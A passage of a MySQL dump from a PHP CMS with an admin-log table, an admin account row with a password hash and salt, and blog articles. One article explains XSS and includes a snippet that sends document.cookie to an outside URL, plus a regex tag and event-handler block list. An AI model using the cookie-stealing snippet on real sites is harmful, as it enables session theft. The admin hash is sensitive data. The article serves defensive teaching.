,'',1480036510),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480053135),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480154505),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1480154515),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480295712),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1480296577),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1480296662),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1480296783),(6,1,'0.0.0.0[IANA保留地址]','Settings-safe',0,'',1480297309),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480318023),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1480321438),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480321446),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1480321649),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480321658),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480387975),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480388035),(31,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1480388077),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480575245),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480575263),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480577452),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1480578464),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480578536),(2,1,'0.0.0.0[IANA保留地址]','Account-logout',0,'',1480578848),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480661666),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1480661674),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480749444),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480749469),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480749495),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480749579),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1480749844),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1480906809),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1480906817),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1480909301),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481016423),(31,1,'0.0.0.0[IANA保留地址]','Category-fields',0,'',1481017520),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481080456),(55,1,'0.0.0.0[IANA保留地址]','Category-type',0,'',1481080503),(55,1,'0.0.0.0[IANA保留地址]','Category-type',0,'',1481080516),(60,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1481080536),(55,1,'0.0.0.0[IANA保留地址]','Category-type',0,'',1481080612),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481189798),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481274295),(6,1,'0.0.0.0[IANA保留地址]','Theme-template',0,'',1481274301),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481334400),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481524177),(34,1,'0.0.0.0[IANA保留地址]','Expand-databack',0,'',1481524185),(63,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1481524406),(63,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1481524415),(63,1,'0.0.0.0[IANA保留地址]','Content-content',0,'',1481524428),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481618569),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1481619110),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481678588),(1,1,'0.0.0.0[IANA保留地址]','Account-login',0,'',1481708906),(6,1,'0.0.0.0[IANA保留地址]','Settings-basic',0,'',1481708916);
/*!40000 ALTER TABLE `np_action_log` ENABLE KEYS */;

#
# Structure for table "np_admin"
#

DROP TABLE IF EXISTS `np_admin`;
CREATE TABLE `np_admin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL COMMENT '用户名',
  `password` varchar(32) NOT NULL COMMENT '密码',
  `email` varchar(40) NOT NULL COMMENT '邮箱',
  `salt` char(6) NOT NULL COMMENT '佐料',
  `last_login_ip` varchar(15) NOT NULL DEFAULT '' COMMENT '登录IP',
  `last_login_ip_attr` varchar(255) NOT NULL DEFAULT '' COMMENT '登录IP地区',
  `last_login_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '登录时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`),
  UNIQUE KEY `email` (`email`),
  KEY `password` (`password`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='管理员表';

#
# Data for table "np_admin"
#

/*!40000 ALTER TABLE `np_admin` DISABLE KEYS */;
INSERT INTO `np_admin` VALUES (1,'levisun','de0c5656615eb18d37cfad23e084449b','levisun@mail.com','0af476','0.0.0.0','IANA保留地址',1481708906,0,0);
/*!40000 ALTER TABLE `np_admin` ENABLE KEYS */;

#
# Structure for table "np_ads"
#

DROP TABLE IF EXISTS `np_ads`;
CREATE TABLE `np_ads` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '广告名',
  `width` smallint(4) NOT NULL DEFAULT '0' COMMENT '图片宽',
  `height` smallint(4) NOT NULL DEFAULT '0' COMMENT '图片高',
  `image` varchar(255) NOT NULL DEFAULT '' COMMENT '图片',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `start_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '开始时间',
  `end_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '结束时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `start_time` (`start_time`),
  KEY `end_time` (`end_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='广告表';

#
# Data for table "np_ads"
#


#
# Structure for table "np_article"
#

DROP TABLE IF EXISTS `np_article`;
CREATE TABLE `np_article` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `keywords` varchar(255) NOT NULL DEFAULT '' COMMENT '关键词',
  `description` varchar(500) NOT NULL DEFAULT '' COMMENT '描述',
  `content` mediumtext NOT NULL COMMENT '内容',
  `thumb` varchar(255) NOT NULL DEFAULT '' COMMENT '缩略图',
  `category_id` smallint(6) unsigned NOT NULL COMMENT '栏目ID',
  `type_id` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '类型ID',
  `is_pass` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '审核',
  `is_com` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '推荐',
  `is_top` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '置顶',
  `is_hot` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '最热',
  `sort` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '排序',
  `hits` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '点击量',
  `comment_count` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '评论量',
  `username` varchar(20) NOT NULL COMMENT '作者名',
  `origin` varchar(255) NOT NULL DEFAULT '' COMMENT '来源',
  `user_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '发布人ID',
  `url` varchar(500) NOT NULL DEFAULT '' COMMENT '跳转链接',
  `is_link` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '跳转',
  `show_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '显示时间',
  `create_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '创建时间',
  `update_time` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '修改时间',
  `delete_time` int(11) unsigned DEFAULT NULL COMMENT '删除时间',
  `access_id` int(11) unsigned NOT NULL DEFAULT '0' COMMENT '访问权限',
  `lang` varchar(50) NOT NULL DEFAULT 'zh-cn' COMMENT '语言',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `type_id` (`type_id`),
  KEY `is_pass` (`is_pass`),
  KEY `is_com` (`is_com`),
  KEY `is_top` (`is_top`),
  KEY `is_hot` (`is_hot`),
  KEY `delete_time` (`delete_time`),
  KEY `lang` (`lang`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='文章表';

#
# Data for table "np_article"
#

/*!40000 ALTER TABLE `np_article` DISABLE KEYS */;
INSERT INTO `np_article` VALUES (1,'XSS攻击与防范','XSS跨站脚本攻击防范','XSS，跨站脚本攻击。为和层叠样式表区分开，跨站脚本在安全领域叫做\"XSS\"。恶意攻击者往Web页面里注入恶意Script代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取cookie信息、会话劫持等各种攻击。XSS是常见的Web攻击技术之一，由于跨站脚本漏洞易于出现且利用成本低，所以被OWASP列为当前的头号Web安全威胁。','&lt;p&gt;&lt;strong&gt;XSS(Cross Site Scripting)，跨站脚本攻击。&lt;/strong&gt;为和层叠样式表(Cascading Style Sheets，CSS)区分开，跨站脚本在安全领域叫做&amp;ldquo;XSS&amp;rdquo;。恶意攻击者往Web页面里注入恶意Script代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取cookie信息、会话劫持等各种攻击。XSS是常见的Web攻击技术之一，由于跨站脚本漏洞易于出现且利用成本低，所以被OWASP列为当前的头号Web安全威胁。&lt;/p&gt;&lt;p&gt;XSS跨站脚本攻击本身对Web服务器没有直接的危害，它借助网站进行传播，使网站上大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web中打开该URL的时候，恶意脚本会在受害者的计算机上悄悄执行。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;根据XSS攻击的效果，可以将XSS分为3类:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;(1) 反射型XSS(Non&amp;minus;persistent XSS)，服务器接受客户端的请求包，不会存储请求包的内容，只是简单的把用户输入的数据&amp;ldquo;反射&amp;rdquo;给浏览器。例如:www.a.com?xss.php?name=。访问这个链接则会弹出页面的cookie内容，若攻击者把alert改为一个精心构造的发送函数，就可以把用户的cookie偷走。&lt;/p&gt;&lt;p&gt;(2) 存储型XSS(Persistent XSS)，这类XSS攻击会把用户输入的数据&amp;ldquo;存储&amp;rdquo;在服务器端，具有很强的稳定性。注入脚本跟反射型XSS大同小异，只是脚本不是通过浏览器&amp;agrave;服务器&amp;agrave;浏览器这样的反射方式，而是多发生在富文本编辑器、日志、留言、配置系统等数据库保存用户输入内容的业务场景。即用户的注入脚本保存到了数据库里，其他用户进行访问涉及到包含恶意脚本的链接都会中招。由于这段恶意的脚本被上传保存到了服务器，这种XSS攻击就叫做&amp;ldquo;存储型XSS&amp;rdquo;。&lt;/p&gt;&lt;p&gt;例如:&lt;/p&gt;&lt;p&gt;服务器端代码:&lt;/p&gt;&lt;pre&gt;\r\n$db.set(&amp;lsquo;name&amp;rsquo;, $_GET[&amp;lsquo;name&amp;rsquo;]);&lt;/pre&gt;&lt;p&gt;HTML页面代码:&lt;/p&gt;&lt;pre&gt;\r\necho &amp;lsquo;Hi,&amp;rsquo; . $db.get[&amp;lsquo;name&amp;rsquo;];&lt;/pre&gt;&lt;p&gt;(3) DOM based XSS(Document Object Model XSS)，这类XSS攻击者将攻击脚本注入到DOM 结构里。出现该类攻击的大多原因是含JavaScrip静态HTML页面存在XSS漏洞。例如下面是一段存在DOM类型跨站脚本漏洞的代码:&lt;/p&gt;&lt;p&gt;在JS中window.location.search是指URL中?之后的内容，document.write是将内容输出到页面。这时把链接换成http://localhost/test.php?default=&lt;/p&gt;&lt;p&gt;那用户的cookie就被盗了。上面的例子只是很简单的一种，总结起来是使用了诸如document.write, innerHTML之类的渲染页面方法需要注意参数内容是否是可信任的。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;XSS攻击的危害，可以将XSS分为3类:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;(1) 窃取用户信息。黑客可以利用跨站脚本漏洞盗取用户cookie而得到用户在该站点的身份权限。如在DOM树上新增图片，用户点击后会将当前cookie发送到黑客服务器:&lt;/p&gt;&lt;pre&gt;\r\nvar i=document.createElement(&amp;ldquo;img&amp;rdquo;);\r\ndocument.body.appendChild(i);\r\ni.src = &amp;ldquo;http://www.niphp.com/?c=&amp;rdquo; + document.cookie;&lt;/pre&gt;&lt;p&gt;(2) 劫持浏览器会话来执行恶意操作，如进行非法转账、强制发表日志或电子邮件等。&lt;/p&gt;&lt;p&gt;(3) 强制弹广告页，刷流量和点击率。&lt;/p&gt;&lt;p&gt;(4) 传播跨站脚本蠕虫。如著名的Samy (XSS)蠕虫攻击、新浪微博蠕虫攻击。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;对于XSS攻击，我们可以做如下防范:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;(1) 输入过滤。永远不要相信用户的输入，对用户输入的数据做一定的过滤。如输入的数据是否符合预期的格式，比如日期格式，Email格式，电话号码格式等等。这样可以初步对XSS漏洞进行防御。&lt;/p&gt;&lt;p&gt;上面的措施只在web端做了限制，攻击者通抓包工具如Fiddler还是可以绕过前端输入的限制，修改请求注入攻击脚本。因此，后台服务器需要在接收到用户输入的数据后，对特殊危险字符进行过滤或者转义处理，然后再存储到数据库中。&lt;/p&gt;&lt;p&gt;(2) 输出编码。服务器端输出到浏览器的数据，可以使用系统的安全函数来进行编码或转义来防范XSS攻击。在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。相应的JavaScript的编码方式可以使用JavascriptEncode。&lt;/p&gt;&lt;p&gt;(3) 安全编码。开发需尽量避免Web客户端文档重写、重定向或其他敏感操作，同时要避免使用客户端数据，这些操作需尽量在服务器端使用动态页面来实现。&lt;/p&gt;&lt;p&gt;(4) HttpOnly Cookie。预防XSS攻击窃取用户cookie最有效的防御手段。Web应用程序在设置cookie时，将其属性设为HttpOnly，就可以避免该网页的cookie被客户端恶意JavaScript窃取，保护用户cookie信息。&lt;/p&gt;&lt;p&gt;(5)WAF(Web Application Firewall)，Web应用防火墙，主要的功能是防范诸如网页木马、XSS以及CSRF等常见的Web漏洞攻击。由第三方公司开发，在企业环境中深受欢迎。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;简单的XSS过虑方法&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;\r\n$string_ = preg_replace(&amp;#39;/&lt;!--?php(.∗?)?--&gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);\r\n$string_ = preg_replace(&amp;#39;/&lt;!--?(.∗?)?--&gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);\r\n$string_ = preg_replace(&amp;#39;/&amp;lt;%(.&amp;lowast;?)%&amp;gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);\r\n$string_ = preg_replace(&amp;#39;/&lt;!--?php¦¦?--&gt;&amp;brvbar;&amp;lt;%&amp;brvbar;%&amp;gt;/si&amp;#39;, &amp;#39;&amp;#39;, $string_);\r\n\r\n$parm = array(&amp;#39;javascript&amp;#39;, &amp;#39;vbscript&amp;#39;, &amp;#39;expression&amp;#39;, &amp;#39;applet&amp;#39;, &amp;#39;meta&amp;#39;, &amp;#39;xml&amp;#39;,&amp;#39;blink&amp;#39;, &amp;#39;link&amp;#39;, &amp;#39;script&amp;#39;, &amp;#39;embed&amp;#39;, &amp;#39;object&amp;#39;, &amp;#39;iframe&amp;#39;, &amp;#39;frame&amp;#39;,&amp;#39;frameset&amp;#39;, &amp;#39;ilayer&amp;#39;, &amp;#39;layer&amp;#39;, &amp;#39;bgsound&amp;#39;, &amp;#39;title&amp;#39;, &amp;#39;base&amp;#39;);\r\nforeach ($parm as $val) {\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;$preg = &amp;#39;/&amp;lt;(&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;gt;(.&amp;lowast;?)&amp;lt;(/&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;gt;/si&amp;#39;;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;$string_ = preg_replace($preg, &amp;#39;&amp;#39;, $string_);\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;$preg = &amp;#39;/&amp;lt;(/?&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;gt;/si&amp;#39;;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;$string_ = preg_replace($preg, &amp;#39;&amp;#39;, $string_);\r\n}\r\n$parm = array(&amp;#39;onabort&amp;#39;, &amp;#39;onactivate&amp;#39;, &amp;#39;onafterprint&amp;#39;, &amp;#39;onafterupdate&amp;#39;,&amp;#39;onbeforeactivate&amp;#39;, &amp;#39;onbeforecopy&amp;#39;, &amp;#39;onbeforecut&amp;#39;, &amp;#39;onbeforedeactivate&amp;#39;,&amp;#39;onbeforeeditfocus&amp;#39;, &amp;#39;onbeforepaste&amp;#39;, &amp;#39;onbeforeprint&amp;#39;, &amp;#39;onbeforeunload&amp;#39;,&amp;#39;onbeforeupdate&amp;#39;, &amp;#39;onblur&amp;#39;, &amp;#39;onbounce&amp;#39;, &amp;#39;oncellchange&amp;#39;, &amp;#39;onchange&amp;#39;,&amp;#39;onclick&amp;#39;, &amp;#39;oncontextmenu&amp;#39;, &amp;#39;oncontrolselect&amp;#39;, &amp;#39;oncopy&amp;#39;, &amp;#39;oncut&amp;#39;,&amp;#39;ondataavailable&amp;#39;, &amp;#39;ondatasetchanged&amp;#39;, &amp;#39;ondatasetcomplete&amp;#39;, &amp;#39;ondblclick&amp;#39;,&amp;#39;ondeactivate&amp;#39;, &amp;#39;ondrag&amp;#39;, &amp;#39;ondragend&amp;#39;, &amp;#39;ondragenter&amp;#39;, &amp;#39;ondragleave&amp;#39;,&amp;#39;ondragover&amp;#39;, &amp;#39;ondragstart&amp;#39;, &amp;#39;ondrop&amp;#39;, &amp;#39;onerror&amp;#39;, &amp;#39;onerrorupdate&amp;#39;,&amp;#39;onfilterchange&amp;#39;, &amp;#39;onfinish&amp;#39;, &amp;#39;onfocus&amp;#39;, &amp;#39;onfocusin&amp;#39;, &amp;#39;onfocusout&amp;#39;,&amp;#39;onhelp&amp;#39;, &amp;#39;onkeydown&amp;#39;, &amp;#39;onkeypress&amp;#39;, &amp;#39;onkeyup&amp;#39;, &amp;#39;onlayoutcomplete&amp;#39;,&amp;#39;onload&amp;#39;, &amp;#39;onlosecapture&amp;#39;, &amp;#39;onmousedown&amp;#39;, &amp;#39;onmouseenter&amp;#39;, &amp;#39;onmouseleave&amp;#39;,&amp;#39;onmousemove&amp;#39;, &amp;#39;onmouseout&amp;#39;, &amp;#39;onmouseover&amp;#39;, &amp;#39;onmouseup&amp;#39;, &amp;#39;onmousewheel&amp;#39;,&amp;#39;onmove&amp;#39;, &amp;#39;onmoveend&amp;#39;, &amp;#39;onmovestart&amp;#39;, &amp;#39;onpaste&amp;#39;, &amp;#39;onpropertychange&amp;#39;,&amp;#39;onreadystatechange&amp;#39;, &amp;#39;onreset&amp;#39;, &amp;#39;onresize&amp;#39;, &amp;#39;onresizeend&amp;#39;,&amp;#39;onresizestart&amp;#39;, &amp;#39;onrowenter&amp;#39;, &amp;#39;onrowexit&amp;#39;, &amp;#39;onrowsdelete&amp;#39;,&amp;#39;onrowsinserted&amp;#39;, &amp;#39;onscroll&amp;#39;, &amp;#39;onselect&amp;#39;, &amp;#39;onselectionchange&amp;#39;,&amp;#39;onselectstart&amp;#39;, &amp;#39;onstart&amp;#39;, &amp;#39;onstop&amp;#39;, &amp;#39;onsubmit&amp;#39;, &amp;#39;onunload&amp;#39;);\r\nforeach ($parm as $val) {\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;$preg = &amp;#39;/(&amp;#39; . $val . &amp;#39;.&amp;lowast;?)&amp;quot;(.&amp;lowast;?)&amp;quot;/si&amp;#39;;\r\n&amp;nbsp;&amp;nbsp; &amp;nbsp;$string_ = preg_replace($preg, &amp;#39;&amp;#39;, $string_);\r\n}\r\n&lt;/pre&gt;','',3,5,1,0,0,0,0,76,0,'','',1,'',0,0,1471657462,1481080536,NULL,0,'zh-cn'),(2,'微信公众平台开放改名：要求命名唯一 每年限一次','微信公众号,微信公众平台','8月22日消息，前不久，微信悄然上线了个人公众号改名功能，今天，微信对公章账号也放开了改名权，不过改名后的公众账号需要符合命名唯一的条件，而且每个公众账号每年仅有一次改名机会。','&lt;p&gt;8月22日消息，前不久，微信悄然上线了个人公众号改名功能，今天，微信对公章账号也放开了改名权，不过改名后的公众账号需要符合命名唯一的条件，而且每个公众账号每年仅有一次改名机会。&lt;/p&gt;\r\n\r\n&lt;p&gt;具体修改规则如下：&lt;/p&gt;\r\n\r\n&lt;p&gt;账号主体为个人类的账号，可在扫码验证主体身份后进行修改。一年内仅可修改一次。(例：2016年1月1日至2016年12月31日内可修改一次名称)。&lt;/p&gt;\r\n\r\n&lt;p&gt;账号主体为企业类、媒体类、政府类、其他组织类的账号，可通过微信认证方式验证主体身份后进行修改。修改的账号名称需遵循平台命名规则，符合平台命名唯一的前提;如名称含有特定关键词(如商标词)时需进一步补充提交资质。&lt;/p&gt;','',3,0,1,0,0,0,0,75,0,'','',1,'',0,1471968000,1471913346,1472008802,NULL,0,'zh-cn'),(3,'ecshop基本常用函数','ecshop基本常用函数','ecshop基本常用函数和方法','&lt;p&gt;&lt;strong&gt;数据安全过虑，防止script攻击&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\ncompile_str($string)&lt;/pre&gt;\r\n\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;检查文件类型&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\ncheck_file_type($filename, $realname=&amp;#39;&amp;#39;,&amp;nbsp;$limit_ext_types=&amp;#39;&amp;#39;)&lt;/pre&gt;\r\n\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;获取用户IP地址&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nreal_ip()&lt;/pre&gt;','',3,0,1,0,0,0,0,45,0,'','',1,'',0,0,1473213026,1474074771,NULL,0,'zh-cn'),(4,'php关于数字防注入,intval溢出,intval和2147483647问题解决方法','','php关于数字防注入,intval溢出,intval和2147483647问题解决方法','&lt;p&gt;关于使用intval强制转换成数字的问题。数字大于2147483647会出现溢出出现负数。使用个方法来替代这个吧&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\n$n=&amp;quot;\n&amp;quot;;\r\n$a=2147483648.05555;\r\necho intval($a).$n; //result&amp;nbsp; -2147483648\r\necho (int) $a,$n;//result&amp;nbsp; -2147483648\r\necho floatval($a).$n;//result&amp;nbsp; 2147483648.0556\r\necho floor(floatval($a)).$n;//result&amp;nbsp; 2147483648&lt;/pre&gt;','',3,0,1,0,0,0,0,25,0,'','',1,'',0,0,1474075817,1474075998,NULL,0,'zh-cn'),(5,'DZ 会员注册与会员登录，没有用程序方法，直接写SQL语句','','DZ 会员注册与会员登录，没有用程序方法，直接写SQL语句','&lt;p&gt;&lt;strong&gt;会员表:&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nINSERT INTO pre_common_member (username, password, email, conisbind, timeoffset, regdate, groupid, avatarstatus) VALUES(&amp;#39;用户名&amp;#39;, &amp;#39;md5(md5(&amp;#39;123456&amp;#39;))真正的密码在UC表中&amp;#39;, &amp;#39;邮箱&amp;#39;, 1, 9999, time(), 10, 1)&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;会员统计表:&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nINSERT INTO pre_common_member_count (uid) VALUES(&amp;#39;会员ID&amp;#39;)&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;会员资料表:&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nINSERT INTO pre_common_member_profile (uid) VALUES(&amp;#39;会员ID&amp;#39;)&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;会员状态表:&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nINSERT INTO pre_common_member_status (uid, regip, lastip, lastvisit, lastactivity) VALUES(&amp;#39;会员ID&amp;#39;,&amp;nbsp;&amp;#39;注册IP&amp;#39;, &amp;#39;登录IP&amp;#39;, &amp;#39;最后活动时间&amp;#39;)&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;UC会员表:&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nINSERT INTO pre_ucenter_members (uid, username, password, email, regip, regdate, salt) VALUES(&amp;#39;会员ID&amp;#39;, &amp;#39;用户名&amp;#39;, &amp;#39;邮箱&amp;#39;, &amp;#39;注册IP&amp;#39;, &amp;#39;注册时间&amp;#39;, &amp;#39;佐料&amp;#39;)\r\nINSERT INTO pre_ucenter_memberfields (uid) VALUES(&amp;#39;会员ID&amp;#39;)&lt;/pre&gt;\r\n\r\n&lt;p&gt;&lt;strong&gt;会员登录&lt;/strong&gt;&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nrequire libfile(&amp;#39;function/member&amp;#39;);\r\nrequire libfile(&amp;#39;class/member&amp;#39;);\r\nsetloginstatus(会员信息数组, $_GET[&amp;#39;cookietime&amp;#39;] ? 2592000 : 0);&lt;/pre&gt;','',3,0,1,0,0,0,0,22,0,'','',1,'',0,1474300800,1474360381,1474425933,NULL,0,'zh-cn'),(6,'PPT网页演示JS库','','会议、演讲离不开幻灯片，它可以有效地辅助演讲者进行表达。目前一些流行的工具，比如Windows平台上的PowerPoint、Mac平台上的Keynote等工具，使得幻灯片的制作变得简单。但是这些幻灯片取决于特定的工具才能演示，且不利于传播。随着HTML5技术的发展，现在JavaScirpt也可以用来制作幻灯片，直接使用浏览器就可以播放，这样你只需给别人发一个链接即可。','&lt;p&gt;会议、演讲离不开幻灯片，它可以有效地辅助演讲者进行表达。目前一些流行的工具，比如Windows平台上的PowerPoint、Mac平台上的Keynote等工具，使得幻灯片的制作变得简单。但是这些幻灯片取决于特定的工具才能演示，且不利于传播。&amp;nbsp;&lt;/p&gt;\r\n\r\n&lt;p&gt;随着HTML5技术的发展，现在JavaScirpt也可以用来制作幻灯片，直接使用浏览器就可以播放，这样你只需给别人发一个链接即可。&lt;/p&gt;\r\n\r\n&lt;p&gt;如果你自己采用JavaScirpt来实现各种幻灯片效果，这是非常繁琐的。本文为你带来这款用于制作幻灯片的JavaScript库，可以使你的工作大大简化。&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;a href=&quot;http://lab.hakim.se/reveal-js/&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;./Uploads/images/201609/57e3aac5ecbc6.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;a href=&quot;http://lab.hakim.se/reveal-js/&quot; target=&quot;_blank&quot;&gt;演示地址&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;http://lab.hakim.se/reveal-js/&quot; target=&quot;_blank&quot;&gt;源码&lt;/a&gt;&amp;nbsp;&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;a href=&quot;http://slides.com/&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;./Uploads/images/201609/57e3ab80a157d.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;\r\n\r\n&lt;p&gt;&lt;a href=&quot;https://slides.com/&quot; target=&quot;_blank&quot;&gt;在线编辑器&lt;/a&gt;&lt;/p&gt;','',2,0,1,0,0,0,0,23,0,'','',1,'',0,0,1474538523,1475052246,NULL,0,'zh-cn'),(7,'PHP 大小写转换函数','','PHP大小写转换函数包括有strtolower，strtoupper，ucfirst，ucwords等等函数，本文章来分别给各位介绍这几个字母大小写转换函数使用方法。','&lt;p&gt;1、将字符串转成小写&lt;/p&gt;\r\n\r\n&lt;p&gt;该函数将传入的字符串参数所有的字符都转换成小写，并以小定形式放回这个字符串。&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nstrtolower();\r\necho strtolower(&amp;#39;Hello WORLD!&amp;#39;);&lt;/pre&gt;\r\n\r\n&lt;p&gt;2、将字符串转成大写&lt;/p&gt;\r\n\r\n&lt;p&gt;该函数的作用同strtolower函数相反，是将传入的字符参数的字符全部转换成大写，并以大写的形式返回这个字符串。&lt;/p&gt;\r\n\r\n&lt;pre&gt;\r\nstrtoupper();\r\necho strtoupper(&amp;#39;Mary Had A Little Lamb and She LOVED It 